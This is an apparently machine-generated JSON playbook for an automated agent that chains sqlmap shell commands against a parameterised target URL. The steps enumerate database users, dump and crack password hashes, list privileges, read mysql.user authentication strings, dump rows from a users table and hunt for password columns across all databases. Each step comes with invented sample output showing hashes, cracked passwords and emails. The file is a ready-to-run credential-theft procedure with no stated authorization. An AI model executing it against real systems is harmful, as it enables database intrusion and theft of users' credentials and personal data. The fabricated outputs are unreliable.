{
  "name": "sqlmap_session_advanced_ops",
  "description": "Advanced sqlmap operations including session management, database manipulation, and privilege escalation",
  "pattern": "sqlmap.*session|sqlmap.*privileges|sqlmap.*dba|sql.*password.*crack",
  "parameters": [
    "target_url",
    "session_file"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "sqlmap",
        "args": [
          "-u",
          "{{target_url}}",
          "--cookie",
          "PHPSESSID=abc123xyz",
          "--batch",
          "--current-user"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:20:10] [INFO] testing connection to the target URL\n[16:20:11] [INFO] using cookie 'PHPSESSID=abc123xyz'\n[16:20:12] [INFO] the back-end DBMS is MySQL\n[16:20:13] [INFO] fetching current user\ncurrent user: 'webapp_user@localhost'\n\n[16:20:14] [INFO] testing if current user is DBA\n[16:20:15] [INFO] checking if current user is DBA\ncurrent user is DBA: False"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "sqlmap",
        "args": [
          "-u",
          "{{target_url}}",
          "--users",
          "--passwords",
          "--batch"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:21:20] [INFO] fetching database users\ndatabase management system users [4]:\n[*] 'root'@'localhost'\n[*] 'webapp_user'@'localhost'\n[*] 'backup_user'@'localhost'\n[*] 'readonly_user'@'%'\n\n[16:21:25] [INFO] fetching database users password hashes\ndatabase management system users password hashes:\n[*] root [1]:\n    password hash: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19\n[*] webapp_user [1]:\n    password hash: *E56A114692FE0DE073F9A1DD68A00EEB9703F3F1\n[*] backup_user [1]:\n    password hash: *196BDEDE2AE4F84CA44C47D54D78478C7E2BD7B7\n\n[16:21:30] [INFO] cracking hashes using dictionary attack\n[16:21:35] [INFO] cracked password 'RootPass123!' for user 'root'\n[16:21:40] [INFO] cracked password 'WebApp2024' for user 'webapp_user'"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "sqlmap",
        "args": [
          "-u",
          "{{target_url}}",
          "--privileges",
          "--batch"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:22:40] [INFO] fetching database users privileges\ndatabase management system users privileges:\n[*] root [1]:\n    privilege: GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION\n[*] webapp_user [4]:\n    privilege: SELECT, INSERT, UPDATE, DELETE ON webapp_db.*\n[*] backup_user [2]:\n    privilege: SELECT, LOCK TABLES ON *.*\n[*] readonly_user [1]:\n    privilege: SELECT ON webapp_db.*\n\nroot user has DBA privileges - potential for privilege escalation"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "sqlmap -u '{{target_url}}' --sql-query='SELECT user,authentication_string FROM mysql.user' --batch"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:23:50] [INFO] executing custom SQL query\n[16:23:51] [INFO] retrieved: root\n[16:23:51] [INFO] retrieved: *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19\n[16:23:52] [INFO] retrieved: webapp_user\n[16:23:52] [INFO] retrieved: *E56A114692FE0DE073F9A1DD68A00EEB9703F3F1\n\nuser\tauthentication_string\nroot\t*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19\nwebapp_user\t*E56A114692FE0DE073F9A1DD68A00EEB9703F3F1\nbackup_user\t*196BDEDE2AE4F84CA44C47D54D78478C7E2BD7B7\n\nExtracted MySQL user hashes from system table"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "sqlmap",
        "args": [
          "-u",
          "{{target_url}}",
          "--dump",
          "-D",
          "webapp_db",
          "-T",
          "users",
          "--start=1",
          "--stop=10",
          "--batch"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:25:00] [INFO] fetching entries 1-10 for table 'users' in database 'webapp_db'\n[16:25:02] [INFO] analyzing table dump for possible password hashes\n[16:25:05] [INFO] recognized possible password hashes in column 'password'\n\nDatabase: webapp_db\nTable: users\n[10 entries]\n+----+------------------+------------------------------------------------------------------+----------------------+\n| id | username         | password                                                         | email                |\n+----+------------------+------------------------------------------------------------------+----------------------+\n| 1  | admin            | 5f4dcc3b5aa765d61d8327deb882cf99 (password)                     | admin@webapp.com     |\n| 2  | john_doe         | 098f6bcd4621d373cade4e832627b4f6 (test)                         | john@example.com     |\n| 3  | jane_smith       | e99a18c428cb38d5f260853678922e03 (abc123)                       | jane@example.com     |\n| 4  | bob_wilson       | 5d41402abc4b2a76b9719d911017c592 (hello)                        | bob@example.com      |\n| 5  | alice_brown      | 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92    | alice@example.com    |\n| 6  | charlie_davis    | 6ca13d52ca70c883e0f0bb101e425a89e8624de51db2d2392593af6a84118090    | charlie@example.com  |\n| 7  | david_miller     | ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f    | david@example.com    |\n| 8  | emma_garcia      | 7c6a180b36896a0a8c02787eeafb0e4c (password1)                    | emma@example.com     |\n| 9  | frank_rodriguez  | 6cb75f652a9b52798eb6cf2201057c73 (password123)                  | frank@example.com    |\n| 10 | grace_martinez   | 819b0643d6b89dc9b579fdfc9094f28e34d1f4b9d6d14d13bc58c21d0ce78d42    | grace@example.com    |\n+----+------------------+------------------------------------------------------------------+----------------------+\n\n6 passwords cracked from MD5/SHA256 hashes"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "sqlmap -u '{{target_url}}' --search -C password,passwd,pwd --batch 2>&1 | grep -E 'found|Table|Column'"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "[16:26:30] [INFO] searching columns LIKE 'password', 'passwd', 'pwd'\n[16:26:35] [INFO] found 8 columns matching in 4 databases\n\nDatabase: webapp_db\nTable: users\nColumn: password (varchar(64))\n\nDatabase: webapp_db\nTable: admin_users  \nColumn: password_hash (varchar(128))\n\nDatabase: old_system\nTable: accounts\nColumn: passwd (varchar(32))\n\nDatabase: backup_db\nTable: user_backup\nColumn: pwd (text)\n\nAll password columns discovered across databases"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
